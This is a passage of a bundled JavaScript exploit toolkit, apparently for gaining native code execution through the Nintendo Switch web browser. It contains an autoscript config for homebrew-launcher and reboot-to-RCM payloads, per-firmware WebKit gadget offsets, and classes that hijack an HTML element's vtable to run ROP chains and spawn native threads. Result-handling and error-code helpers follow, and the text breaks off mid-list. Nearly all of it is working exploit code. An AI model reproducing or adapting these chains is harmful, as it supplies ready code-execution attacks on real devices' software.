(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(require,module,exports){
module.exports={
  "sdbcore":false,
  "autoclose":false,
  "autorun":false,
  "autorunScript": true,
  "nvcore": true,
  "debug": false,
  "scripts": {
    "hbl": {
      "scriptPath": "autoscripts/hbl.js",
      "selector": "hbl",
      "icon": "/hbmenu.jpg",
      "minversion": 100,
      "maxversion": 300
    },
    "hbl400": {
      "scriptPath": "autoscripts/hbl400.js",
      "selector": "hbl400",
      "icon": "/hbmenu.jpg",
      "minversion": 400,
      "maxversion": 410
    },
    "nereba": {
      "scriptPath": "autoscripts/nereba.js",
      "selector": "nereba",
      "icon": "/nereba.png",
      "minversion": 100,
      "maxversion": 100
    },
    "caffeine": {
      "scriptPath": "autoscripts/caffeine.js",
      "selector": "caffeine",
      "icon": "/caffeine.png",
      "minversion": 200,
      "maxversion": 300
    },
    "caffeine400": {
      "scriptPath": "autoscripts/caffeine400.js",
      "selector": "caffeine400",
      "icon": "/caffeine.png",
      "minversion": 400,
      "maxversion": 410
    },
    "reboot_to_rcm": {
      "scriptPath": "autoscripts/reboot_to_rcm.js",
      "selector": "reboot_to_rcm",
      "icon": "/reboot_to_rcm.png",
      "minversion": 100,
      "maxversion": 100
    },
    "fake_news": {
      "scriptPath": "autoscripts/fake_news.js",
      "selector": "fake_news",
      "icon": "/fake_news.png",
      "minversion": 100,
      "maxversion": 100
    }
  }
}
},{}],2:[function(require,module,exports){
/* eslint no-redeclare: "off" */
var utils = require('./utils');

function getChainVersion() {
	if (utils.version == 100) {
		return '1.0.0'
	} else if (utils.version == 200) {
		return '2.0.0';
	} else if (utils.version == 210) {
		return '2.1.0';
	} else if (utils.version == 300) {
		return '3.0.0';
	} else if (utils.version == 400) {
		return '4.0.0';
	} else if (utils.version == 500) {
		return '5.0.0';
	} else if (utils.version == 510) {
		return '5.1.0';
	} else if (utils.version == 600) {
		return '6.0.0';
	} else {
		throw new Error('AltCaller not supported');
	}
}

class AltCaller {
	constructor (sc) {
		this.chainVersion = getChainVersion();
		this.sc = sc;

		// webkit offsets
		var loadglobalfunc = utils.add2(sc.base, {
			'1.0.0': 0xEECE90,
			'2.0.0': 0xEA9720,
			'2.1.0': 0xEAA184,
			'3.0.0': 0xE93FA8,
			'4.0.0': 0xEB9800,
			'5.0.0': 0xF46450,
			'5.1.0': 0xF474C0,
			'6.0.0': 0xFD2DA0
		}[this.chainVersion]);

		var stacksavefunc = utils.add2(sc.base, {
			'1.0.0': 0xE85F24,
			'2.0.0': 0xE43078,
			'2.1.0': 0xE43ADC,
			'3.0.0': 0xE35674,
			'4.0.0': 0xE59E94,
			'5.0.0': 0xEE0814,
			'5.1.0': 0xEE1894,
			'6.0.0': 0x178E4
		}[this.chainVersion]);

		this.gotcallergadg = utils.add2(sc.base, {
			'1.0.0': 0xF6C97C,
			'2.0.0': 0xF264DC,
			'2.1.0': 0xF26F40,
			'3.0.0': 0xF1198C,
			'4.0.0': 0xF3AA78,
			'5.0.0': 0xFCFFC4,
			'5.1.0': 0xFD0F34,
			'6.0.0': 0x8F3FC0
		}[this.chainVersion]);

		this.globptr = utils.add2(sc.base, {
			'1.0.0': 0x183D000,
			'2.0.0': 0x180AA40,
			'2.1.0': 0x180AA40,
			'3.0.0': 0x17EF780,
			'4.0.0': 0x181DE50,
			'5.0.0': 0x18A7E40,
			'5.1.0': 0x18A8EB0,
			'6.0.0': 0x18F9D00
		}[this.chainVersion]);

		var gotfuncptrs = utils.add2(sc.base, {
			'1.0.0': 0x1816D88,
			'2.0.0': 0x17E6BF0,
			'2.1.0': 0x17E6BF0,
			'3.0.0': 0x17CBA78,
			'4.0.0': 0x17FA090,
			'5.0.0': 0x1884058,
			'5.1.0': 0x18850A0,
			'6.0.0': 0x18CB040
		}[this.chainVersion]);

		this.gotptr = utils.add2(sc.base, {
			'1.0.0': 0x1813828,
			'2.0.0': 0x17E3700,
			'2.1.0': 0x17E3700,
			'3.0.0': 0x17C8A58,
			'4.0.0': 0x17F7068,
			'5.0.0': 0x1881030,
			'5.1.0': 0x1882070,
			'6.0.0': 0x18C8DB8
		}[this.chainVersion]);

		var stackrestorefunc;
		if (utils.version == 100) {
			stackrestorefunc = utils.add2(sc.base, 0xE85F44);
		} else {
			stackrestorefunc = utils.add2(stacksavefunc, 20);
		}

		var triggerElement = document.createElement('foo');
		this.triggerElement = triggerElement;

		var htmlElement = sc.read8(sc.getAddr(triggerElement), 0x18 >> 2);
		this.htmlElement = htmlElement;

		var htmlElementVtable = sc.read8(htmlElement, 0);
		this.htmlElementVtable = htmlElementVtable;

		var vtableSize = 0x490;
		var fakeVtable = sc.malloc(0x490);
		this.fakeVtable = fakeVtable;

		for (var i = 0; i < vtableSize; i += 8) {
			sc.write8(sc.read8(htmlElementVtable, i >> 2), fakeVtable, i >> 2);
		}

		var savegadg = sc.gadget([0x00, 0x04, 0x00, 0xa9, 0x02, 0x0c, 0x01, 0xa9, 0x04, 0x14, 0x02, 0xa9, 0x06, 0x1c, 0x03, 0xa9]);
		var loadgadg = sc.gadget([0x02, 0x0c, 0x41, 0xa9, 0x04, 0x14, 0x42, 0xa9, 0x06, 0x1c, 0x43, 0xa9, 0x08, 0x24, 0x44, 0xa9]);

		var savedContext = sc.malloc(0x210);
		var callContext = sc.malloc(0x210);
		this.callContextPointer = callContext;

		var pointerHolder = sc.malloc(0x100);
		this.pointerHolder = pointerHolder;

		sc.write8(savedContext, pointerHolder, 8 >> 2);
		sc.write8(callContext, pointerHolder, 0x10 >> 2);

		var stackSize = 1024 * 1024;
		var ropStart = 1022 * 1024;
		var callStack = sc.malloc(stackSize);

		this.stackArgsPointer = utils.add2(callStack, ropStart);

		sc.write8(this.stackArgsPointer, callContext, 0xF8 >> 2); // SP
		var calledReg;
		if (utils.version == 100) {
			sc.write8(sc.gadget([0x20, 0x01, 0x3F, 0xD6, 0xFD, 0x7B, 0xC1, 0xA8, 0xC0, 0x03, 0x5F, 0xD6], true), callContext, 0x100 >> 2);
			/*
			  1674D8 BLR             X9
			  1674DC LDP             X29, X30, [SP],#0x10
			  1674E0 RET
			*/
			calledReg = 9;
		} else {
			sc.write8(sc.gadget([128, 2, 63, 214, 253, 123, 66, 169, 244, 79, 65, 169, 255, 195, 0, 145, 192, 3, 95, 214], true), callContext, 0x100 >> 2); // X30 (link register)
			/*
			  EF4FEC  BLR   X20
			  EF4FF0  LDP   X29, X30, [SP,#0x20]
			  EF4FF4  LDP   X20, X19, [SP,#0x10]
			  EF4FF8  ADD   SP, SP, #0x30
			  EF4FFC  RET
			*/
			calledReg = 20;
		}
		this.calledRegOffset = calledReg * 2;

		var stack = [];
		if (utils.version != 100) {
			stack = [
				0, // argument
				0, // argument
				0, // X20 (ignored / argument)
				0, // X19 (ignored / argument)
				0, // X29 (ignored / argument)
				sc.gadget([253, 123, 66, 169, 244, 79, 65, 169, 255, 195, 0, 145, 192, 3, 95, 214]), // X30
				/*
				  EF4FF0  LDP   X29, X30, [SP,#0x20]
				  EF4FF4  LDP   X20, X19, [SP,#0x10]
				  EF4FF8  ADD   SP, SP, #0x30
				  EF4FFC  RET
				*/

				0, // pad
				0  // pad
			];
		} else {
			stack = [
		      0, // X29 (ignored / argument)
		      sc.gadget([0xFD, 0x7B, 0x41, 0xA9,0xF4, 0x4F, 0xC2, 0xA8,0xC0, 0x03, 0x5F, 0xD6]) // X30
		      /*
		        LDP             X29, X30, [SP,#0x10]
		        LDP             X20, X19, [SP],#0x20
		        RET
		      */
			];
		}

		var storeX0toX20;
		if (utils.version != 100) {
			storeX0toX20 = [253, 123, 65, 169, 128, 2, 0, 249, 244, 79, 194, 168, 192, 3, 95, 214];
		} else {
			storeX0toX20 = [128, 2, 0, 249, 253, 123, 65, 169, 244, 79, 194, 168, 192, 3, 95, 214];
		}

		stack = stack.concat([
			pointerHolder, // X20 (location to store X0 to)
			0, // X19
			0, // X29
			sc.gadget(storeX0toX20, true), // X30

			// store the return value (X0) to X20 (saved context's X0)
			/*
			  F10610                 LDP             X29, X30, [SP,#0x10]
			  F10614                 STR             X0, [X20]
			  F10618                 LDP             X20, X19, [SP],#0x20
			  F1061C                 RET
			*/
			utils.add2(savedContext, 0x100), // X20
			stackrestorefunc, // X19 (value to store: LDP X29, X30, [SP],#0x10 ; RET)

			0, // X29
			sc.gadget([253, 123, 65, 169, 224, 3, 19, 170, 243, 7, 66, 248, 192, 3, 95, 214]), // X30

			/*
			  F1DC34                 LDP             X29, X30, [SP,#0x10]
			  F1DC38                 MOV             X0, X19
			  F1DC3C                 LDR             X19, [SP],#0x20
			  F1DC40                 RET
			*/

			0, // X19
			0, // pad
			0, // X29
			sc.gadget(storeX0toX20, true), // X30

			/*
			  F10610                 LDP             X29, X30, [SP,#0x10]
			  F10614                 STR             X0, [X20]
			  F10618                 LDP             X20, X19, [SP],#0x20
			  F1061C                 RET
			*/
			0, // X20
			savedContext, // X19
			0, // X29
			sc.gadget([253, 123, 65, 169, 224, 3, 19, 170, 243, 7, 66, 248, 192, 3, 95, 214]), // X30

			/*
			  F1DC34                 LDP             X29, X30, [SP,#0x10]
			  F1DC38                 MOV             X0, X19
			  F1DC3C                 LDR             X19, [SP],#0x20
			  F1DC40                 RET
			*/
			0, // X19
			0, // pad
			0, // X29
			loadgadg // X30
			// longjmp (load state)
		]);

		for (var i = 0; i < stack.length; i++) {
			if (stack[i] !== 0) {
				sc.write8(stack[i], this.stackArgsPointer, (i * 8) >> 2);
			}
		}

		/* Adjust for .scrollLeft() change. */
		if (utils.version >= 600) {
			sc.write8(stacksavefunc, fakeVtable, (62 * 8) >> 2);
		} else {
			sc.write8(stacksavefunc, fakeVtable, (61 * 8) >> 2);
		}
		/*
		  E43ADC  STP X29, X30, [SP,#-0x10]!
		  E43AE0  MOV X29, SP
		  E43AE4  BL  wkcTextBreakIteratorLastPeer_0
		*/

		var values = [
			loadglobalfunc,
			/*
			  EAA184  ADRP  X8, #qword_180AA40@PAGE
			  EAA188  LDR   X0, [X8,#qword_180AA40@PAGEOFF]
			  EAA18C  RET
			*/
			sc.gadget([0, 4, 64, 249, 192, 3, 95, 214]),
			/*
			  F0E2AC  LDR   X0, [X0,#8]
			  F0E2B0  RET
			*/
			savegadg, // save context to X0 gadget
			loadglobalfunc,
			/*
			  EAA184  ADRP  X8, #qword_180AA40@PAGE
			  EAA188  LDR   X0, [X8,#qword_180AA40@PAGEOFF]
			  EAA18C  RET
			*/
			sc.gadget([0, 8, 64, 249, 192, 3, 95, 214]),
			/*
			  E899CC  LDR   X0, [X0,#0x10]
			  E899D0  RET
			*/
			loadgadg // load context from X0 gadget
		];

		this.magicView = new Uint32Array(new ArrayBuffer(6 * 8));
		this.backupView = new Uint32Array((6 * 8) / 4);
		this.newView = new Uint32Array((6 * 8) / 4);
		for (var i = 0; i < values.length; i++) {
			this.newView[i * 2] = values[i][0];
			this.newView[i * 2 + 1] = values[i][1];
		}
		sc.write8(gotfuncptrs, sc.getAddr(this.magicView), 0x10 >> 2); // got function pointers

		this.backupView.set(this.magicView);

		this.callContext = new Uint32Array(sc.allocated[callContext]);
		this.oldGotThing = sc.read8(this.gotptr);
	}

	// GPR only
	call (funcp) {
		var sc = this.sc;

		var argc = arguments.length - 1;
		if (argc > 13) {
			throw new Error('too many arguments');
		}

		var callContext = this.callContext;
		for (var i = 0; i < argc; i++) {
			var arg = arguments[i + 1];
			if (ArrayBuffer.isView(arg)) {
				arg = arg.buffer;
			}
			if (arg instanceof ArrayBuffer) {
				arg = sc.getArrayBufferAddr(arg);
			}

			if (typeof arg === 'number') {
				arg = [arg, 0];
			} else if (!(arg instanceof Array)) {
				throw new Error('invalid argument type');
			}

			if (i < 8) {
				callContext[i * 2] = arg[0];
				callContext[i * 2 + 1] = arg[1];
			} else if (utils.version != 100) {
				sc.write8(arg, this.stackArgsPointer, ((i - 8) * 8) >> 2);
			} else {
				throw new Error('too many arguments')
			}
		}

		var calledRegOffset = this.calledRegOffset;
		callContext[calledRegOffset] = funcp[0];
		callContext[calledRegOffset+1] = funcp[1];

		this.triggerCallImpl();

		return sc.read8(this.pointerHolder);
	}

	triggerCallImpl () {
		var sc = this.sc;

		sc.write8(this.fakeVtable, this.htmlElement, 0);

		sc.write8(this.gotcallergadg, this.gotptr, 0);
		/*
		  F26F40  BL  wkcSSLForceTerminatePeer_0
		  F26F44  BL  wkcNetForceTerminatePeer_0
		  F26F48  BL  wkcFileForceTerminatePeer_0
		  F26F4C  BL  wkcThreadForceTerminatePeer_0
		  F26F50  BL  wkcTimerForceTerminatePeer_0
		  F26F54  BL  wkcHeapForceTerminatePeer_0
		  F26F58  BL  wkcscoryForceTerminatePeer_0
		  F26F5C  BL  wkcDebugPrintForceTerminatePeer_0
		*/

		this.magicView.set(this.newView);
		var saved = sc.read8(this.globptr, 0);
		sc.write8(this.pointerHolder, this.globptr, 0);
		var out = this.triggerElement.scrollLeft >>> 0;
		sc.write8(saved, this.globptr, 0);

		this.magicView.set(this.backupView);
		sc.write8(this.oldGotThing, this.gotptr, 0);
		sc.write8(this.htmlElementVtable, this.htmlElement, 0);

		return out;
	}

	// "unsafe" functions allow a call to be repeated very quickly,
	// but don't perform automatic cleanup. the usual call interface
	// must not be used before unsafeCleanupCall has been invoked.
	// unsafeCleanupCall must be invoked or global data will be left
	// in an invalid state.
	unsafeSetupCall (funcp) {
		var sc = this.sc;

		var argc = arguments.length - 1;
		if (argc > 13) {
			throw new Error('too many arguments');
		}

		var callContext = this.callContext;
		for (var i = 0; i < argc; i++) {
			var arg = arguments[i + 1];
			if (typeof arg === 'number') {
				arg = [arg, 0];
			} else if (!(arg instanceof Array)) {
				throw new Error('invalid argument type');
			}

			if (i < 8) {
				callContext[i * 2] = arg[0];
				callContext[i * 2 + 1] = arg[1];
			} else if (utils.version != 100) {
				sc.write8(arg, this.stackArgsPointer, ((i - 8) * 8) >> 2);
			} else {
				throw new Error('too many arguments')
			}
		}
		var calledRegOffset = this.calledRegOffset;
		callContext[calledRegOffset] = funcp[0];
		callContext[calledRegOffset+1] = funcp[1];
		sc.write8(this.fakeVtable, this.htmlElement, 0);
		sc.write8(this.gotcallergadg, this.gotptr, 0);
		this.magicView.set(this.newView);
		this.saved = sc.read8(this.globptr, 0);
		sc.write8(this.pointerHolder, this.globptr, 0);
	}

	unsafeTriggerCall () {
		return this.triggerElement.scrollLeft;
	}

	unsafeCleanupCall () {
		this.sc.write8(this.saved, this.globptr, 0);
		this.magicView.set(this.backupView);
		this.sc.write8(this.oldGotThing, this.gotptr, 0);
		this.sc.write8(this.htmlElementVtable, this.htmlElement, 0);
	}
}

module.exports = AltCaller;

},{"./utils":20}],3:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* global performance */
var utils = require('./utils');

class AsyncCaller {
	constructor (sc) {
		this.sc = sc;

		this.load_gadget = sc.gadget('020c41a9041442a9061c43a9082444a9');
		// this.ldr_x8 = sc.gadget('080540f900013fd6607e4092fd7b42a9f44f41a9')

		this.str_x0_x19 = sc.gadget('fd7b41a9600200f9f30742f8c0035fd6');
		this.ldr_x0 = sc.gadget('e00740f9fd7b41a9ff830091c0035fd6');
		this.br_x16 = sc.gadget('fd7bc1a800021fd6');
		this.ldr_x19 = sc.gadget('f31740f9fd7b43a9ff030191c0035fd6');
		this.exit_thread = sc.gadget('410100d4');
	}

	// timeout in milliseconds
	//  -1: no timeout
	call (func_ptr, args, timeout) {
		if (args.length >= 8) {
			throw new Error('too many arguments');
		}
		for (var i = 0; i < args.length; i++) {
			if (ArrayBuffer.isView(args[i])) {
				args[i] = args[i].buffer;
			}
			if (args[i] instanceof ArrayBuffer) {
				args[i] = this.sc.getArrayBufferAddr(args[i]);
			}
		}
		for (var i = args.length; i < 8; i++) {
			args[i] = [0, 0];
		}
		if (timeout === undefined) {
			timeout = 5000;
		}
		/*
      ldr_x0:
      0x7853e729a4      e00740f9       ldr x0, [sp, 8] ; x0 = &(&exitThread-0x30)
      0x7853e729a8      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7853e729ac      ff830091       add sp, sp, 0x20
      0x7853e729b0      c0035fd6       ret

      load_gadget:
      0x7853ed626c      020c41a9       ldp x2, x3, [x0, 0x10]
      0x7853ed6270      041442a9       ldp x4, x5, [x0, 0x20]
      0x7853ed6274      061c43a9       ldp x6, x7, [x0, 0x30]
      0x7853ed6278      082444a9       ldp x8, x9, [x0, 0x40]
      0x7853ed627c      0a2c45a9       ldp x10, x11, [x0, 0x50]
      -- snip --
      0x7a9c63963c      104448a9       ldp x16, x17, [x0, 0x80]
      -- snip --
      0x7853ed62a0      1c744ea9       ldp x28, x29, [x0, 0xe0]
      0x7853ed62a4      1e8040f9       ldr x30, [x0, 0x100]
      0x7853ed62a8      017c40f9       ldr x1, [x0, 0xf8]
      0x7853ed62ac      3f000091       mov sp, x1
      0x7853ed62b0      0004516d       ldp d0, d1, [x0, 0x110]
      -- snip --
      0x7853ed62f0      1f0441fd       ldr d31, [x0, 0x208]
      0x7853ed62f4      000440a9       ldp x0, x1, [x0]
      0x7853ed62f8      c0035fd6       ret

      br_x16:
      0x7a9c5ae6b0      fd7bc1a8       ldp x29, x30, [sp], 0x10
      0x7a9c5ae6b4      00021fd6       br x16

      FUNCTION EXECUTES HERE

      ldr_x19:
      0x7a9c22fea8      f31740f9       ldr x19, [sp, 0x28]       ; [0x28:4]=0x8e2e9c ; '('
      0x7a9c22feac      fd7b43a9       ldp x29, x30, [sp, 0x30]
      0x7a9c22feb0      ff030191       add sp, sp, 0x40
      0x7a9c22feb4      c0035fd6       ret

      str_x0_x19:
      0x7a9c303f4c      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7a9c303f50      600200f9       str x0, [x19]
      0x7a9c303f54      f30742f8       ldr x19, [sp], 0x20
      0x7a9c303f58      c0035fd6       ret

      ldr_x0:
      0x7853e729a4      e00740f9       ldr x0, [sp, 8] ; x0 = magic return flag
      0x7853e729a8      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7853e729ac      ff830091       add sp, sp, 0x20
      0x7853e729b0      c0035fd6       ret

      str_x0_x19
      0x7a9c303f4c      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7a9c303f50      600200f9       str x0, [x19] ; magic return flag
      0x7a9c303f54      f30742f8       ldr x19, [sp], 0x20
      0x7a9c303f58      c0035fd6       ret

      exit_thread:
      0x7853e855b4      410100d4       svc 0xa      ; ExitThread
    */

		var load_gadget = this.load_gadget;
		// var ldr_x8 = this.ldr_x8
		var str_x0_x19 = this.str_x0_x19;
		var ldr_x0 = this.ldr_x0;
		var br_x16 = this.br_x16;
		var ldr_x19 = this.ldr_x19;
		var exit_thread = this.exit_thread;
		var sc = this.sc;

		return new Promise((resolve, reject) => {
			var magic_return_flag = [0, 0];
			while (magic_return_flag[0] === 0 && magic_return_flag[1] === 0) {
				magic_return_flag = [Math.floor(Math.random() * 0x1000), Math.floor(Math.random() * 0x1000)];
			}

			var load_area = sc.malloc(0x280);
			var sp = sc.malloc(0x300);
			var initial_sp = sp;
			var scratch = sc.malloc(0x20);
			sc.write8([0, 0], scratch, 0x00 >> 2); // return value
			sc.write8([0, 0], scratch, 0x10 >> 2); // magic return flag
			var return_value_addr = utils.add2(scratch, 0x00);
			var magic_return_flag_addr = utils.add2(scratch, 0x10);

			sc.write8(load_area, sp, 0x8 >> 2); // ldr x0, [sp, 8]
			sc.write8(load_gadget, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			sp = utils.add2(sp, 0x20); // add sp, sp, 0x20

			sc.write8(args[0], load_area, 0x000 >> 2);
			sc.write8(args[1], load_area, 0x008 >> 2);
			sc.write8(args[2], load_area, 0x010 >> 2);
			sc.write8(args[3], load_area, 0x018 >> 2);
			sc.write8(args[4], load_area, 0x020 >> 2);
			sc.write8(args[5], load_area, 0x028 >> 2);
			sc.write8(args[6], load_area, 0x030 >> 2);
			sc.write8(args[7], load_area, 0x038 >> 2);
			sc.write8(func_ptr, load_area, 0x080 >> 2); // x16
			sc.write8(sp, load_area, 0xf8 >> 2); // sp
			sc.write8(br_x16, load_area, 0x100 >> 2); // x30 (LR)

			sc.write8(ldr_x19, sp, 0x8 >> 2); // ldp x29, x30, [sp], 0x10
			sp = utils.add2(sp, 0x10);

			// br x16
			//  FUNCTION EXECUTES HERE

			// ldr_x19:
			sc.write8(return_value_addr, sp, 0x28 >> 2); // ldr x19, [sp, 0x28]
			sc.write8(str_x0_x19, sp, 0x38 >> 2); // ldp x29, x30, [sp, 0x30]
			sp = utils.add2(sp, 0x40); // add sp, sp, 0x40
			// ret

			// str_x0_19:
			sc.write8(ldr_x0, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			// str x0, [x19]
			sc.write8(magic_return_flag_addr, sp, 0x0 >> 2); // ldr x19, [sp], 0x20
			sp = utils.add2(sp, 0x20);
			// ret

			// ldr_x0:
			sc.write8(magic_return_flag, sp, 0x8 >> 2); // ldr x0, [sp, 8]
			sc.write8(str_x0_x19, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			sp = utils.add2(sp, 0x20); // add sp, sp, 0x20
			// ret

			// str_x0_19:
			sc.write8(exit_thread, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			// str x0, [x19]
			// ldr x19, [sp], 0x20
			sp = utils.add2(sp, 0x20);
			// ret

			// svcExitThread

			var prio = [58, 0];
			var handle = sc.svcCreateThread(ldr_x0, load_area, initial_sp, prio, 1).assertOk();
			sc.svcStartThread(handle).assertOk();

			var begin = performance.now();
			var wait = function () {
				var field = sc.read8(scratch, 0x10 >> 2);
				if (field[0] !== magic_return_flag[0] || field[1] !== magic_return_flag[1]) {
					if (timeout >= 0 && (performance.now() - begin) > timeout) {
						sc.svcCloseHandle(handle).assertOk();
						sc.free(load_area);
						sc.free(initial_sp);
						sc.free(scratch);
						reject(new Error('timed out'));
					} else {
						window.requestAnimationFrame(wait);
					}
				} else {
					sc.svcCloseHandle(handle).assertOk();
					sc.free(load_area);
					sc.free(initial_sp);
					sc.free(scratch);
					resolve(sc.read8(scratch, 0x00));
				}
			};
			window.requestAnimationFrame(wait);
		});
	}
}

module.exports = AsyncCaller;

},{"./utils":20}],4:[function(require,module,exports){
var utils = require('./utils');

var emptyOk;

class Result {
	constructor(isOk, value) {
		this.isOk = isOk;
		this.value = value;
	}

	/*
    If this result is not Ok, throw the error. If it is, return the value.
    Example:
      sc.svcCloseHandle(handle).assertOk();
      var thread = sc.svcCreateThread(...).assertOk();
    Throws:
      The error, if this is an Err result.
    Returns:
      The value, if this is an Ok result.
   */
	assertOk() {
		if(!this.isOk) {
			if(this.value) {
				throw new Error(this.value);
			} else {
				throw new Error("no error?");
			}
		}
		return this.value;
	}

	/*
    If this result is not Err, throw an error. If it is, return the error.
    Example:
      var err = sc.svcConnectToPort("bad port").assertError();
    Throws:
      new Error("expected error but was successful") if this is an Ok result.
    Returns:
      The error, if this is an Err result.
   */
	assertError() {
		if(this.isOk) {
			throw new Error("expected error but was successful");
		}
		return this.value;
	}

	/*
    Convenience function for working with ResultCodes. Expects a certain error code.
    Example:
      sc.svcCloseHandle(0).assertErrorCode(0xe401);
    Throws:
      new Error("expected error but was successful") if this is an Ok result.
      new Error("expected error code"...) if the error code does not match.
    Returns:
      The numeric error code.
   */
	assertErrorCode(expected) {
		expected = utils.trunc32(expected);
		var code = utils.trunc32(this.assertError().resultCode);
		if(code === expected) {
			return this.value;
		} else {
			throw new Error("expected error code 0x" + expected.toString(16) + ", got " + code.toString(16));
		}
	}

	/*
    map(f):
      Transform an Ok value, but pass through an Err value.
      Returns:
        A new Ok result with the return value of the mapping function if the
        original Result was Ok. Otherwise, the same Err result.
    map(f, e):
      Transform both an Ok value and an Err value.
      Returns:
        If Ok, return new Ok with the return value of the Ok mapping function.
        If Err, return new Err with the return value of the Err mapping function.
   */
	map(f, e) {
		if(this.isOk) {
			return new Ok(f(this.value));
		} else {
			if(e !== undefined) {
				return new Err(e(this.value));
			} else {
				return this;
			}
		}
	}

	/*
    Transform an Err value, but pass through an Ok value.
   */
	mapErr(e) {
		if(this.isOk) {
			return this;
		} else {
			return new Err(e(this.value));
		}
	}

	/*
		If Ok, return new Err with the value.
		If Err, return new Ok with the error.
		Useful for if you expect an error and to not get one is a real error.
	*/
	invert() {
		if(this.isOk) {
			return new Err(this.value);
		} else {
			return new Ok(this.value);
		}
	}

	/*
		If Ok and f(this.value) is also Ok, return Ok(f(this.value)).
		Otherwise, return Err(this.value)
	 */
	andThen(f) {
		if(this.isOk) {
			return f(this.value);
		} else {
			return this;
		}
	}
  
	/*
    Shorthand for .map(() => nv). Discards the original Ok value, useful for if it was
    going to be `undefined` anyway.
   */
	replaceValue(nv) {
		if(this.isOk) {
			return new Ok(nv);
		} else {
			return this;
		}
	}

	/*
    Get the value if this is an Ok result, otherwise null.
   */
	getValue() {
		return this.isOk ? this.value : null;
	}

	/*
    Get the error if this is an Err result, otherwise null.
   */
	getError() {
		return !this.isOk ? this.value : null;
	}

	/*
    If this is Ok, return the value. Otherwise, return v.
   */
	unwrapOrElse(v) {
		if(this.isOk) {
			return this.value;
		} else {
			return v;
		}
	}

	toString() {
		return "Result<" + (this.isOk ? "Ok" : "Err") + ">(" + this.value + ")";
	}
}

class Ok extends Result {
	constructor(value) {
		super(true, value);
	}
}

class Err extends Result {
	constructor(value) {
		super(false, value);
	}
}

module.exports = {Result, Ok, NullOk: new Ok(), Err};

},{"./utils":20}],5:[function(require,module,exports){
var modules = {};
var codes = {};

class ResultCode extends Error {
	constructor (code) {
		if (Array.isArray(code)) {
			code = code[0];
		}

		var moduleNumber = code & 0xFF;
		var descriptionNumber = code >> 8;
		var moduleName = modules[moduleNumber] || 'unknown';
		var descriptionString = codes[code] || 'unknown';

		super('0x' + code.toString(16) + ' (' + descriptionString + ' in module ' + moduleName + ')');

		this.code = code;
		this.resultCode = code;
		this.moduleNumber = moduleNumber;
		this.descriptionNumber = descriptionNumber;
		this.moduleName = moduleName;
		this.descriptionString = descriptionString;
	}

	toString() {
		return this.message;
	}
}

module.exports = ResultCode;

// last updated: http://switchbrew.org/index.php?title=Error_codes&oldid=2536
modules = {
	1: 'Kernel',
	2: 'FS',
	3: 'NVIDIA',
	5: 'NCM',
	6: 'DD',
	8: 'LR',
	9: 'Loader',
	10: 'CMIF (IPC command interface)',
	11: 'HIPC (IPC)',
	15: 'PM',
	16: 'NS',
	18: 'HTC',
	21: 'SM',
	22: 'RO userland',
	24: 'SDMMC',
	26: 'SPL',
	100: 'ETHC',
	101: 'I2C',
	105: 'Settings',
	110: 'NIFM',
	114: 'Display',
	116: 'NTC',
	117: 'FGM',
	120: 'PCIE',
	121: 'Friends',
	123: 'SSL',
	124: 'Account',
	128: 'AM',
	126: 'Mii',
	129: 'Play Report',
	133: 'PCV',
	134: 'OMM',
	137: 'NIM',
	138: 'PSC',
	140: 'USB',
	143: 'BTM',
	147: 'ERPT',
	148: 'APM',
	154: 'NPNS',
	157: 'ARP',
	158: 'BOOT',
	161: 'NFC',
	162: 'Userland assert',
	168: 'Userland crash',
	203: 'HID',
	206: 'Capture',
	345: 'libnx',
	651: 'TC',
	800: 'General web-applet',
	809: 'WifiWebAuthApplet',
	810: 'Whitelisted-applet',
	811: 'ShopN'
};

var codestrs = [
	'0x1C01  14  Invalid kernel capability descriptor',
	'0x4201  33  IsDebugMode isn\'t set.',
	'0xCA01  101  Invalid size',
	'0xCC01  102  Invalid address',
	'0xCE01  103  Address is NULL / buffer size is too small.',
	'0xD001  104  Memory full',
	'0xD201  105  Handle-table full.',
	'0xD401  106  Invalid memory state / invalid memory permissions.',
	'0xD801  108  When trying to set executable permission on memory.',
	'0xDC01  110  Stack address outside allowed range',
	'0xE001  112  Invalid thread priority.',
	'0xE201  113  Invalid processor id.',
	'0xE401  114  Invalid handle.',
	'0xE601  115  Syscall copy from user failed.',
	'0xE801  116  Invalid combination',
	'0xEA01  117  Time out? When you give 0 handles to svcWaitSynchronizationN.',
	'0xEC01  118  Canceled/interrupted [?]',
	'0xEE01  119  Exceeding maximum',
	'0xF001  120  Invalid enum',
	'0xF201  121  No such entry',
	'0xF401  122  Irq/DeviceAddressSpace/{...} already registered',
	'0xF601  123  Port remote dead',
	'0xF801  124  [Usermode] Unhandled interrupt',
	'0xFA01  125  Wrong memory permission?',
	'0xFC01  126  Reserved value',
	'0xFE01  127  Invalid hardware breakpoint',
	'0x10001  128  [Usermode] Fatal exception',
	'0x10601  131  Port max sessions exceeded',
	'0x10801  132  Resource limit exceeded',
	'0x41001  520  Process not being debugged',
	'0xE02  7  High byte in input u64 is zero.',
	"0x7802  60  The specified NCA-type doesn't exist for this title.",
	'0x7D202  1001  Process does not have RomFs',
	'0x7D402  1002  Title-id not found / savedata not found.',
	'0x13B002  2520  Gamecard not inserted',
	'0x13DA02  2541  Version check failed when mounting gamecard sysupdate partition?',
	'0x171402  2954  Invalid gamecard handle.',
	'0x196002  3248  Out of memory',
	'0x196202  3249  Out of memory',
	'0x1A4A02  3365  Out of memory',
	'0x235E02  4527  NCA-path used with the wrong titleID.',
	'0x250E02  4743  Corrupted NAX0 header.',
	'0x251002  4744  Invalid NAX0 magicnum.',
	'0x2EE202  6001  Invalid input',
	'0x2EE602  6003  Path too long',
